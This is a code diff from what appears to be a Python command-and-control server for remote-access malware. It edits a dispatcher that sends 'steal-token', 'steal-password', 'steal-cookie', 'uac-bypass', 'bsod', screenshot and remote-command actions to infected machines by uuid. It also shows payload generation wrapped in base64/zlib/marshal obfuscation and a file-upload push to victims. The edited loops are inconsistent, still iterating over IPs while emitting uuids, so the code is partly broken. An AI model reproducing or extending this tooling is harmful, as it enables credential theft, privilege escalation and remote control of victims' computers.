@@ -108,36 +108,42 @@ class C2:
 
     def explotation_module(self, data):
         explotation_module_type = data['explotation_module']
-        ip_range = data['uuids']
+        uuids = data['uuids']
 
-        print(ip_range)
+        for uuid in uuids:
+            if explotation_module_type == "steal-token":
+                for ip in ip_addresses:
+                    self.sio.emit('steal-token', {"uuid": uuid})
 
-        if explotation_module_type == "steal-cookie":
-            for ip in ip_addresses:
-                self.sio.emit('steal-cookie', {"ip": ip})
+            if explotation_module_type == "steal-password":
+                for ip in ip_addresses:
+                    self.sio.emit('steal-password', {"uuid": uuid})
+
+            if explotation_module_type == "steal-cookie":
+                for ip in ip_addresses:
+                    self.sio.emit('steal-cookie', {"uuid": uuid})
+                
+            if explotation_module_type == "bsod":
+                for ip in ip_addresses:
+                    self.sio.emit('bsod', {"uuid": uuid})
             
-        if explotation_module_type == "bsod":
-            for ip in ip_addresses:
-                self.sio.emit('bsod', {"ip": ip})
-        
-        if explotation_module_type == "screen-shot":
-            for ip in ip_addresses:
-                self.sio.emit('screen-shot', {"ip": ip})
-        
-        if explotation_module_type == "uac-bypass":
-            for ip in ip_addresses:
-                self.sio.emit('uac-bypass', {"ip": ip})
-        
-        if explotation_module_type == "send-command":
-            for ip in ip_addresses:
-                self.sio.emit('send-command', {"ip": ip})
+            if explotation_module_type == "screen-shot":
+                for ip in ip_addresses:
+                    self.sio.emit('screen-shot', {"uuid": uuid})
+            
+            if explotation_module_type == "uac-bypass":
+                for ip in ip_addresses:
+                    self.sio.emit('uac-bypass', {"uuid": uuid})
+            
+            if explotation_module_type == "send-command":
+                for ip in ip_addresses:
+                    self.sio.emit('send-command', {"uuid": uuid})
 
 
     def generate(self, generate):
         os_name = generate['os']
         arch = generate['arch']
         url = generate['ip']
-        print(url)
         
         if not os.path.isdir('payloads'):
             os.makedirs('payloads')
@@ -202,7 +208,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             
             print(base64_encoded)
 
-        for ip in ip_addresses:
+        for uuid in data['uuids']:
             self.sio.emit("upload_file", {'ip': ip, 'file_name': file.filename, 'path': data['path'], 'file': base64_encoded})
 
     
